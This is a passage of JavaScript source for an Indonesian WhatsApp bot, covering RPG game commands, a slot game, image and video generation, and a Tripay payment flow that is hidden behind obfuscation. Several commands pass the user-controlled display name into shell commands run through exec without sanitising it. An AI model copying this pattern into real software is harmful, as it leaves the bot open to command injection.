'Oakheart', 'Doonatel', 'Broughton', 'Carlisle', 'Murlayfield', 'Nuxvar']
        const ad = dungeon[Math.floor(Math.random() * dungeon.length)]
        anu = JSON.parse(fs.readFileSync('./database/adventure/avden.json'))
        randIndex = anu[Math.floor(Math.random() * anu.length)]
        hasil = await getBuffer(randIndex)
        adven = Math.floor(Math.random() * (25 - 25 + 2) + 90)
        level.addLevelingXp(sender, adven, _level)
        money = Math.floor(Math.random() * (150 - 25 + 2) + 20)
        addUang(sender, money)
        helad = randomNomor(10, 30)
        poti = Math.floor(Math.random() * 5)
        addPotioUser(sender, poti)
        await setTimeout(() => {
        teks = `◪ *「 DEATH 」

├─ ❏ *Tempat : ${ad}*
├─ ❏ *Player : ${getReason}*
├─ ❏ *MONEY : Rp.${money}*
├─ ❏ *EXP : ${adven}Xp*
├─ ❏ *Heal : -${helad}*
└─ ❏ *Gumption : ${poti}*`
Manik.sendImage(m.chat, hasil, teks, m)
}, 4000)
        await healAdd(sender, helad)
        rplimitAdd(sender, rpliminya)
        break
        }
       case prefix+'gaincrystal':{
	if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
	if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
	if (!isGroup) return reply(mess.only.group)
	if(userHeal < 25){ return reply(`Maaf Heal Anda Tersisa ${userHeal}, Silahkan Melakukan Healing`)}
        getId = namerpg.getNameId(sender, _name)
        getReason = namerpg.getNameReason(getId, _name)
        ngab = ['Goa', 'Lembah', 'Dasar Laut', 'Gunung Berapi', 'Rumah Orang Kaya', 'Bank']
        const tmpat = ngab[Math.floor(Math.random() * ngab.length)]
        var mning = randomNomor(1000)
              addCrysUser(sender, mning)
        //TRAGEDI
        if(tmpat === 'Goa'){
        	tragedi = 'Goanya Runtuh'
        }
        if(tmpat === 'Lembah'){
        	tragedi = 'Lembahnya Longsor'
        }
        if(tmpat === 'Dasar Laut'){
        	tragedi = 'Terjadi Tsunami'
        }
        if(tmpat === 'Gunung Berapi'){
        	tragedi = 'Gunungnya Meletus'
        }
        if(tmpat === 'Rumah Orang Kaya'){
        	tragedi = 'Sistem Keamanan Aktif'
        }
        if(tmpat === 'Bank'){
        	tragedi = 'Security Datang'
        }
        //AKSI
        if(tragedi === 'Security Datang'){
        	aksi = 'Melarikan Diri Dan Berhasil Menghindari Security'
        }
        if(tragedi === 'Sistem Keamanan Aktif'){
        	aksi = 'Bersembunyi Dan Berhasil Lari'
        }
        if(tragedi === 'Gunungnya Meletus'){
        	aksi = 'Melindungi Diri Dan Berhasil Selamat'
        }
        if(tragedi === 'Terjadi Tsunami'){
        	aksi = 'Terbawa Arus Tetapi Selamat Disuatu Pulau'
        }
        if(tragedi === 'Lembahnya Longsor'){
        	aksi = 'Terkubur Dalam Lembah Tetapi Berhasil Keluar'
        }
        if(tragedi === 'Goanya Runtuh'){
        	aksi = 'Tertimbun Bebatuan Dalam Goa Tetapi Berhasil Keluar'
        }
        //BACKGROUND
        if(tmpat === 'Goa'){
        	bckgrn = 'https://telegra.ph/file/5da8f6663208f4866212f.jpg'
        }
        if(tmpat === 'Lembah'){
        	bckgrn = 'Lembahnya Longsor'
        }
        if(tmpat === 'Dasar Laut'){
        	bckgrn = 'https://telegra.ph/file/a2de4d61d8917978a50ba.jpg'
        }
        if(tmpat === 'Gunung Berapi'){
        	bckgrn = 'https://telegra.ph/file/28d3b12fa1b39f986ca76.jpg'
        }
        if(tmpat === 'Rumah Orang Kaya'){
        	bckgrn = 'https://telegra.ph/file/400374a71cc5bdde21e7d.jpg'
        }
        if(tmpat === 'Bank'){
        	bckgrn = 'https://telegra.ph/file/f8ba56e6648780abc63eb.jpg'
        }
        buffbck = await getBuffer(bckgrn)
        await setTimeout(() => {
          reply(`${getReason} Sedang Masuk Ke ${tmpat}`)
        }, 1000)
        await setTimeout(() => {
          reply(`${getReason} Mengambil Crystal`)
        }, 2000)
        await setTimeout(() => {
          reply(`Tiba-Tiba ${tragedi}`)
        }, 3000)
        await setTimeout(() => {
        	Manik.sendImage(m.chat, buffbck, `◪ *「 MISSION COMPLETED 」*

├─ ❏ *Player* : *${getReason}*
├─ ❏ *Get Crystal* : _${mning} 💎_
├─ ❏ *Tempat* : *${tmpat}*
└─ ❏ *Aksi* : *${aksi}*`,m)
        }, 4000)
      rplimitAdd(sender, rpliminya)
        break
              } 
        case prefix+'mining':
               if(userPotan < 1){ return Hikari.sendMessage(from, `Limit Kmu Sudah Habis`, text, { quoted: Arya })}
              var mining = randomNomor(1000)
              addUang(sender, mining)
              await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
              rplimitAdd(sender, rpliminya)
              break
        case prefix+'luckyslot': { //BY MANIK
    const sotoy = ['🍊 : 🍒 : 🍐', '🍒 : 🔔 : 🍊', '🍇 : 🍇 : 🍇', '🍊 : 🍋 : 🔔', '🔔 : 🍒 : 🍐', '🔔 : 🍒 : 🍊', '🍊 : 🍋 : 🔔', '🍐 : 🍒 : 🍋', '🍐 : 🍐 : 🍐', '🍊 : 🍒 : 🍒', '🔔 : 🔔 : 🍇', '🍌 : 🍒 : 🔔', '🍐 : 🔔 : 🔔', '🍊 : 🍋 : 🍒', '🍋 : 🍋 : 🍌', '🔔 : 🔔 : 🍇', '🔔 : 🍐 : 🍇', '🔔 : 🔔 : 🔔', '🍒 : 🍒 : 🍒', '🍌 : 🍌 : 🍌']
    const sotoy2 = ['🍊 : 🍒 : 🍐', '🍒 : 🔔 : 🍊', '🍊 : 🍋 : 🔔', '🔔 : 🍒 : 🍐', '🔔 : 🍒 : 🍊', '🍊 : 🍋 : 🔔', '🍐 : 🍒 : 🍋', '🍊 : 🍒 : 🍒', '🔔 : 🔔 : 🍇', '🍌 : 🍒 : 🔔', '🍐 : 🔔 : 🔔', '🍊 : 🍋 : 🍒', '🍋 : 🍋 : 🍌', '🔔 : 🔔 : 🍇', '🔔 : 🍐 : 🍇']
    const sotoy1 = ['🍊 : 🍒 : 🍐', '🍒 : 🔔 : 🍊', '🍊 : 🍋 : 🔔', '🔔 : 🍒 : 🍐', '🔔 : 🍒 : 🍊', '🍊 : 🍋 : 🔔', '🍐 : 🍒 : 🍋', '🍊 : 🍒 : 🍒', '🔔 : 🔔 : 🍇', '🍌 : 🍒 : 🔔', '🍐 : 🔔 : 🔔', '🍊 : 🍋 : 🍒', '🍋 : 🍋 : 🍌', '🔔 : 🔔 : 🍇', '🔔 : 🍐 : 🍇']
    const somtoy5 = ['🍊 : 🍒 : 🍐', '🍒 : 🔔 : 🍊', '🍊 : 🍋 : 🔔', '🔔 : 🍒 : 🍐', '🔔 : 🍒 : 🍊', '🍊 : 🍋 : 🔔', '🍐 : 🍒 : 🍋', '🍊 : 🍒 : 🍒', '🔔 : 🔔 : 🍇', '🍌 : 🍒 : 🔔', '🍐 : 🔔 : 🔔', '🍊 : 🍋 : 🍒', '🍋 : 🍋 : 🍌', '🔔 : 🔔 : 🍇', '🔔 : 🍐 : 🍇']
    const sotoy3 = ['🔔 : 🔔 : 🔔', '🍒 : 🍒 : 🍒', '🍌 : 🍌 : 🍌']
        const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
        const somtoy2 = sotoy1[Math.floor(Math.random() * sotoy1.length)]
        const somtoy3 = sotoy2[Math.floor(Math.random() * sotoy2.length)]
        const somtoy4 = sotoy3[Math.floor(Math.random() * sotoy3.length)]
        arye = randomNomor(100)
        if(somtoy === '🍇 : 🍇 : 🍇') {
        reply(`
[ SLOTS ]\n-----------------
 ${somtoy2}
 ${somtoy}<=====
 ${somtoy3}
[ SLOTS ]
SELAMAT KAMU MEMENANGKAN ${arye}Crystal !! 
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`)
addCrysUser(sender, arye)
}
if(somtoy === '🍐 : 🍐 : 🍐') {
        reply(`
[ SLOTS ]\n-----------------
 ${somtoy2}
 ${somtoy}<=====
 ${somtoy3}
[ SLOTS ]
SELAMAT KAMU MEMENANGKAN ${arye}Crystal !! 
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`)
addCrysUser(sender, arye)
}
if(somtoy === '🔔 : 🔔 : 🔔') {
        reply(`
[ SLOTS ]\n-----------------
 ${somtoy2}
 ${somtoy}<=====
 ${somtoy3}
[ SLOTS ]
SELAMAT KAMU MEMENANGKAN ${arye}Crystal !! 
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`)
addCrysUser(sender, arye)
}
if(somtoy === '🍒 : 🍒 : 🍒') {
        reply(`
[ SLOTS ]\n-----------------
 ${somtoy2}
 ${somtoy}<=====
 ${somtoy3}
[ SLOTS ]
SELAMAT KAMU MEMENANGKAN ${arye}Crystal !! 
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`)
addCrysUser(sender, arye)
}
if(somtoy === '🍌 : 🍌 : 🍌') {
        reply(`
[ SLOTS ]\n-----------------
 ${somtoy2}
 ${somtoy}<=====
 ${somtoy3}
[ SLOTS ]
SELAMAT KAMU MEMENANGKAN ${arye}Crystal !! 
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`)
addCrysUser(sender, arye)
}
if(somtoy === somtoy5) {
        reply(`
[ SLOTS ]\n-----------------
 ${somtoy2}
 ${somtoy}<=====
 ${somtoy3}
[ SLOTS ]
KAMU KALAH COBA LAGI YAHH>_<
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`)
addCrysUser(sender, arye)
}
        break
        }
case prefix+'mission':{
if (!isGroup) return reply(`Group Only`)
if (!isBrave) return reply(`Ketik ${prefix}joinrp Nama untuk Bergabung kedalam GAME RP`)
getId = namerpg.getNameId(sender, _name)
getReason = namerpg.getNameReason(getId, _name)
const listMessage = {
  text: `Hallo ${getReason}\nSilahkan Pilih Misi Sesuai Level Anda!!!\nTingkatkan Level Anda Untuk Membuka Misi Selanjutnya\n*Semoga Berhasil Menyelesaikan Misi(✖﹏✖)*`,
  footer: `MISSION ROLEPLAYER`,
  buttonText: "Click Here!",
  sections: [
{
"title": `MISI KE 1`,
 rows: [
{
"title": `Membunuh Slime`,
"description": `Misi Level 1-10`,
"rowId": `${prefix}slime`
}
]
}
,
{
"title": `MISI KE 2`,
 rows: [
{
"title": `Membunuh Goblin`,
"description": `Misi Level 11-20`,
"rowId": `${prefix}goblin`
}
]
}
,
{
"title": `MISI KE 3`,
 rows: [
{
"title": `Membunuh Devil`,
"description": `Misi Level 21-30`,
"rowId": `${prefix}devil`
}
]
}
,
{
"title": `MISI KE 4`,
 rows: [
{
"title": `Membunuh Behemoth`,
"description": `Misi Level 31-40`,
"rowId": `${prefix}behemoth`
}
]
}
,
{
"title": `MISI KE 5`,
 rows: [
{
"title": `Membunuh Demon`,
"description": `Misi Level 41-50`,
"rowId": `${prefix}demon`
}
]
}
,
{
"title": `MISI KE 6`,
 rows: [
{
"title": `Membunuh DemonKing`,
"description": `Misi Level 51-60`,
"rowId": `${prefix}demonking`
}
]
},
{
"title": `MISI KE 7`,
 rows: [
{
"title": `Membunuh Last Monster`,
"description": `Misi Level 61-100`,
"rowId": `${prefix}lastmonster`
}
]
}
],
listType: 1
}
const sendMsg = await Manik.sendMessage(m.chat, listMessage)
               break
}

 case prefix+'fdgjbc':{
 try {//mencoba
           ppuser = await Manik.profilePictureUrl(sender, 'image')
         } catch {//jika foto profil tidak tersedia maka akan dialihkan ke link dibawah sebagai gambar pengganti
           ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }         
         let nasib = './media/image/saldo.jpg'
         let beam = './media/font/Boogaloo-Regular.ttf'
         let resz = await reSize(ppuser, 150, 150)//mengubah ukuran gambar profile (Ini ukuran standar yang tidak perlu dirobah!)
         var rand7 = 'pp.jpg'
         let sen = sender
         let nem = `${pushname}`
         if (nem.length > 15){
         	nem = 'Kakak'
         }
         let randh = getRandom('.jpg')
         let randp = getRandom('.jpeg')
         let resImage = `./media/image/${randh}`
         let numbr = sen.replace('@s.whatsapp.net', '')//menghapus @s.whatsapp.net dari nomor member
         let locate_pp = `./media/image/${randp}`//get pp WhatsApp 
         fs.writeFileSync(locate_pp, resz)//membuat file jpg yang telah disempurnakan oleh resz  
             exec(`magick '${nasib}' -size 500x700 -fill 'black' -font '${beam}' -pointsize 30 -interline-spacing 1 -annotate +190+365 '${nem}' -fill 'black' -font '${beam}' -pointsize 30 -interline-spacing 1 -annotate +190+415 'Rp${getMonUser(sender)}' -fill 'black' -font '${beam}' -pointsize 30 -interline-spacing 1 -annotate +190+470 '${sender.replace("@s.whatsapp.net", "")}' '${locate_pp}' -gravity center -geometry -0+-210 -composite '${resImage}'`)//menyusun dan membuat hasil akhir
         setTimeout(() => { fs.unlinkSync(resImage)}, 10000)
         setTimeout(() => { fs.unlinkSync(locate_pp)}, 10000)
         await sleep(3000)//turu
Manik.sendImage(m.chat, resImage, `*─ 「 CHECK YOUR ACCOUNT 」 ─*
     
_Berikut Adalah Data Akun Anda_
_》Saldo User : Rp${getMonUser(sender)}_
_》Name : ${pushname}_
_》Id : ${sender.replace("@s.whatsapp.net", "")}_

Note: Jika Undefined Artinya Saldo Kamu Rp0
Saldo Hanya Bisa Untuk Topup Saja, Tidak Bisa Ditarik!.`, m)//maka pada hasil akan terlihat sebagai buffer         
}
break

//ADU NASIB
 case prefix+'adunasib':{

		reply(`Maaf Fitur Sedang Perbaikan`)
 /*	try {//mencoba
           ppuser = await Manik.profilePictureUrl(sender, 'image')
         } catch {//jika foto profil tidak tersedia maka akan dialihkan ke link dibawah sebagai gambar pengganti
           ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }         
         let nasib = './media/image/nasib.jpg'
         let resz = await reSize(ppuser, 200, 200)//mengubah ukuran gambar profile (Ini ukuran standar yang tidak perlu dirobah!)
         var rand7 = 'pp.jpg'
         let sen = sender
         const crypto = require('crypto')
         const createSerial = (size) => {
         return crypto.randomBytes(size).toString('hex').slice(0, size)
         }
        const ser = createSerial(15).replace(/1|2|3|4|5|6|7|8|9|0/g, "")
         let randh = getRandom('.jpg')
         let randp = getRandom('.jpeg')
         no = 0
         let resImage = `./media/image/${ser}${no++}.jpg`
         let numbr = sen.replace('@s.whatsapp.net', '')//menghapus @s.whatsapp.net dari nomor member
         let locate_pp = `./media/gif/${randp}`//get pp WhatsApp 
         fs.writeFileSync(locate_pp, resz)//membuat file jpg yang telah disempurnakan oleh resz  
         let posisih = ['-420+20','-420+420','-420+-420','420+-420','-0+420','-0+20','-0+-420','+420+-420','+420+20','+420+420']
         let posih = posisih[Math.floor(Math.random() * posisih.length)]
         let psih = posisih[Math.floor(Math.random() * posisih.length)]
         let posh = posisih[Math.floor(Math.random() * posisih.length)]
         let pish = posisih[Math.floor(Math.random() * posisih.length)]
         let phs = posisih[Math.floor(Math.random() * posisih.length)]
         let pjs = posisih[Math.floor(Math.random() * posisih.length)]
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${psih}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${psih}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${posh}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${pish}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${phs}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${pjs}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
await sleep(5000)//turu
fs.mkdirSync(`./media/${sender}`)
await sleep(5000)//turu
let pend = getRandom('.mp4')
let out = `./media/${sender}/${pend}`
	exec(`ffmpeg -y -f image2 -framerate 1 -i './media/gif/${ser}%d.jpg' ${out}`)
	.on('exit', () => { 
	exec(`ffmpeg -i './media/${sender}/${pend}' -i sound.mp3 -map 0:v -map 1:a -c:v copy -shortest '${pend}'`)
	})
   setTimeout(() => { 
   	if (pjs == '-420+20') { 
        let masa = 'Menjadi Artis Terkenal'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
else if (pjs == '-420+420') { 
         let masa = 'Menjadi Gelandangan'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '-420+-420') { 
         let masa = 'Menjadi Pejabat Negara'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '-0+20') { 
         let masa = 'Menjadj Pemain bola'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '-0+420') { 
         let masa = 'Menjadi apa yang kamu cita-citakan'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '-0+-420') { 
         let masa = 'Menjadi Orang Kaya'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '+420+20') { 
         let masa = `Meninggal Dunia Mungkin Pada Umur ${umr}`
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '+420+420') { 
         let masa = 'Menjadi Rakyat Biasa'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
         else if (pjs == '+420+-420') { 
         let masa = 'Menjadi Penyanyi'
Manik.sendMessage(from, { video: { url: `${pend}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nDi masa depan, kamu akan ${masa}` }, { quoted: m })}
}, 5000)
   setTimeout(() => {
      	fs.unlinkSync(pend)
          fs.rmSync(`./media/${sender}`, { recursive: true })
          fs.rmSync(`./media/gif`, { recursive: true })
          fs.mkdirSync(`./media/gif`)
          }, 20000)
        */
}
break


case prefix+'mmmmmasadepan':{   
 	try {//mencoba
           ppuser = await Manik.profilePictureUrl(sender, 'image')
         } catch {//jika foto profil tidak tersedia maka akan dialihkan ke link dibawah sebagai gambar pengganti
           ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }         
         let nasib = './media/image/nasib.jpg'
         let resz = await reSize(ppuser, 200, 200)//mengubah ukuran gambar profile (Ini ukuran standar yang tidak perlu dirobah!)
         var rand7 = 'pp.jpg'
         let sen = sender
         const crypto = require('crypto')
         const createSerial = (size) => {
         return crypto.randomBytes(size).toString('hex').slice(0, size)
         }
        const ser = createSerial(15).replace(/1|2|3|4|5|6|7|8|9|0/g, "")
         let randh = getRandom('.jpg')
         let randp = getRandom('.jpeg')
         no = 1
         let resImage = `./media/image/${ser}${no++}.jpg`
         let numbr = sen.replace('@s.whatsapp.net', '')//menghapus @s.whatsapp.net dari nomor member
         let locate_pp = `./media/gif/${randp}`//get pp WhatsApp 
         fs.writeFileSync(locate_pp, resz)//membuat file jpg yang telah disempurnakan oleh resz  
         let posisih = ['-420+20','-420+420','-420+-420','420+-420','-0+420','-0+20','-0+-420','+420+-420','+420+20','+420+420']
         let posih = posisih[Math.floor(Math.random() * posisih.length)]
         let psih = posisih[Math.floor(Math.random() * posisih.length)]
         let posh = posisih[Math.floor(Math.random() * posisih.length)]
         let pish = posisih[Math.floor(Math.random() * posisih.length)]
         let phs = posisih[Math.floor(Math.random() * posisih.length)]
         let pjs = posisih[Math.floor(Math.random() * posisih.length)]
             exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${posih}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${psih}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${posh}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${pish}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${phs}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
exec(`magick '${nasib}' -size 1280x1280 '${locate_pp}' -gravity center -geometry '${pjs}' -composite './media/gif/${ser}${no++}.jpg'`)//menyusun dan membuat hasil akhir
await sleep(5000)//turu
let pend = getRandom('.mp4')
let out = `./media/gif/${pend}`
	exec(`ffmpeg -y -f image2 -framerate 1 -i './media/gif/${ser}%d.jpg' ${out}`)
   //exec(`ffmpeg -y -f image2 -framerate 1 -i ./media/gif/${ser}%d.jpg' -vf scale=2064x1376 ${out}`)
   setTimeout(() => { Manik.sendMessage(from, { video: { url: `${out}` }, mimetype: 'video/mp4', fileName: `${out}`, caption: `Hai ${pushname}👋\nNih Masa Depan Kamu` }, { quoted: m })}, 5000)
   setTimeout(() => {
          fs.rmSync("./media/gif", { recursive: true })
          fs.mkdirSync("./media/gif")
          }, 20000)
        
}
break

//SEWA BOT OTOMATIS BY MANIK
case prefix+'sewabot':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                
                if (!isUrl(q) && !q.includes('whatsapp.com')) return reply(`Link Invalid`)
                if(!q) return reply('link groupnya mana?')
               if(fs.existsSync(`./database/sewa/${from}.json`)) return reply(`Selesaikan pembelian anda sebelumnya`)
const axios = require('axios');
const crypto = require('crypto');

const merchant_ref = 'BUYSC' + randomNomor(1,999999)
const amount = global.hargasewa

const signature = crypto.createHmac('sha256', privateKey).update(merchant_code + merchant_ref + amount).digest('hex');

function _0x25c7(){const _0x7b36de=['19091727lTbgyB','_\x0a\x0aJika\x20Anda\x20Sudah\x20Melakukan\x20Pembayaran\x20Silahkan\x20Klik\x20Tombol\x20Confirmasi\x20Dibawah\x20Dan\x20Bot\x20Akan\x20Secara\x20Otomatis\x20Masuk\x20Group\x20Tanpa\x20Acc\x20Owner!.','amount','amount_received','2088270ctcMcQ','7145500tKRNdM','reference','1997942PiUcqF','writeFileSync','then','chat','qr_url','AryaBot','message','9477984SgpdYj','8nnuDpm','*──\x20「\x20CHECK\x20OUT\x20」\x20──*\x0a\x0a_Silahkan\x20Scan\x20Qris\x20Ini\x20Untuk\x20Membayar:_\x0a_》No\x20Ref\x20:\x20','Bearer\x20','7cFQbez','1624479XQQDiI','https://wa.me/6283155997772','_\x0a_》Fee\x20:\x20','sendMessage','.json','stringify','1460434xYIhWa','DEPOSIT\x20BOT\x20','_\x0a_》Total\x20:\x20','data','QRISC','catch','_\x0a_》Harga\x20:\x20','ManikBot\x20By\x20Own-Manik√'];_0x25c7=function(){return _0x7b36de;};return _0x25c7();}function _0xd89b(_0x27fc53,_0x4ae66d){const _0x25c751=_0x25c7();return _0xd89b=function(_0xd89b23,_0x40f5cb){_0xd89b23=_0xd89b23-0x1dd;let _0x544667=_0x25c751[_0xd89b23];return _0x544667;},_0xd89b(_0x27fc53,_0x4ae66d);}const _0x469ddd=_0xd89b;(function(_0x480566,_0x44fd7d){const _0xce7f6c=_0xd89b,_0x1eb0a5=_0x480566();while(!![]){try{const _0x3f7a78=-parseInt(_0xce7f6c(0x1f2))/0x1+parseInt(_0xce7f6c(0x1e0))/0x2+parseInt(_0xce7f6c(0x1ec))/0x3+parseInt(_0xce7f6c(0x1de))/0x4+-parseInt(_0xce7f6c(0x1dd))/0x5+-parseInt(_0xce7f6c(0x1e7))/0x6*(-parseInt(_0xce7f6c(0x1eb))/0x7)+-parseInt(_0xce7f6c(0x1e8))/0x8*(parseInt(_0xce7f6c(0x1fa))/0x9);if(_0x3f7a78===_0x44fd7d)break;else _0x1eb0a5['push'](_0x1eb0a5['shift']());}catch(_0x4964db){_0x1eb0a5['push'](_0x1eb0a5['shift']());}}}(_0x25c7,0xdd768));const data={'method':_0x469ddd(0x1f6),'merchant_ref':merchant_ref,'amount':amount,'customer_name':_0x469ddd(0x1e5),'customer_email':'aryamanik104@gmail.com','order_items':[{'name':_0x469ddd(0x1f3)+amount,'price':amount,'quantity':0x1}],'return_url':_0x469ddd(0x1ed),'signature':signature};axios['post']('https://tripay.co.id/api/transaction/create',data,{'headers':{'Authorization':_0x469ddd(0x1ea)+apiKey},'validateStatus':function(_0x109621){return _0x109621<0x3e7;}})[_0x469ddd(0x1e2)](_0x26b2a6=>{const _0x5d1811=_0x469ddd;let _0x1a771f=[{'quickReplyButton':{'displayText':'📜\x20Confirmasi','id':prefix+'confirmsewa\x20'+q+'\x20'+_0x26b2a6[_0x5d1811(0x1f5)][_0x5d1811(0x1f5)]['reference']}}];messn=_0x5d1811(0x1e9)+_0x26b2a6[_0x5d1811(0x1f5)][_0x5d1811(0x1f5)][_0x5d1811(0x1df)]+_0x5d1811(0x1f8)+formatmoney(_0x26b2a6['data'][_0x5d1811(0x1f5)][_0x5d1811(0x1fd)])+_0x5d1811(0x1ee)+formatmoney(_0x26b2a6['data'][_0x5d1811(0x1f5)]['total_fee'])+_0x5d1811(0x1f4)+formatmoney(_0x26b2a6[_0x5d1811(0x1f5)][_0x5d1811(0x1f5)][_0x5d1811(0x1fc)])+'_\x0a_》Method\x20:\x20Qris\x20Otomatis_\x0a_》Status\x20:\x20'+_0x26b2a6[_0x5d1811(0x1f5)][_0x5d1811(0x1f5)]['status']+_0x5d1811(0x1fb),Manik[_0x5d1811(0x1ef)](m[_0x5d1811(0x1e3)],{'caption':messn,'image':{'url':_0x26b2a6['data'][_0x5d1811(0x1f5)][_0x5d1811(0x1e4)]},'templateButtons':_0x1a771f,'footer':_0x5d1811(0x1f9),'mentions':[m['sender']]});let _0x1d6a2f={'id':sender,'ref':_0x26b2a6[_0x5d1811(0x1f5)][_0x5d1811(0x1f5)]['reference'],'status':_0x26b2a6[_0x5d1811(0x1f5)]['data']['status']};fs[_0x5d1811(0x1e1)]('./database/sewa/'+from+_0x5d1811(0x1f0),JSON[_0x5d1811(0x1f1)](_0x1d6a2f));})[_0x469ddd(0x1f7)](_0x5c8555=>{const _0x209a71=_0x469ddd;reply(_0x5c8555['data'][_0x209a71(0x1e6)]);});
break
}

case prefix+'confirmsewa':{
	if(!fs.existsSync(`./database/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
const axios = require('axios');
const deppo = JSON.parse(fs.readFileSync(`./database/sewa/${from}.json`))
const _0x1f9a33=_0x5886;(function(_0x4647f9,_0x329996){const _0x5bcc13=_0x5886,_0x3f5250=_0x4647f9();while(!![]){try{const _0x47d7e5=parseInt(_0x5bcc13(0x1f1))/0x1+parseInt(_0x5bcc13(0x209))/0x2+parseInt(_0x5bcc13(0x210))/0x3+-parseInt(_0x5bcc13(0x206))/0x4+-parseInt(_0x5bcc13(0x1f2))/0x5*(-parseInt(_0x5bcc13(0x200))/0x6)+-parseInt(_0x5bcc13(0x1f7))/0x7+parseInt(_0x5bcc13(0x214))/0x8*(-parseInt(_0x5bcc13(0x1fd))/0x9);if(_0x47d7e5===_0x329996)break;else _0x3f5250['push'](_0x3f5250['shift']());}catch(_0x3f2000){_0x3f5250['push'](_0x3f5250['shift']());}}}(_0x53fb,0x7f1af));var reference=''+(checkRefSewa(sender,deppo)?checkRefSewa(sender,deppo):args[0x2]);function _0x5886(_0x5aed18,_0x342aff){const _0x53fb53=_0x53fb();return _0x5886=function(_0x588674,_0x2015e8){_0x588674=_0x588674-0x1f0;let _0x3d3030=_0x53fb53[_0x588674];return _0x3d3030;},_0x5886(_0x5aed18,_0x342aff);}function _0x53fb(){const 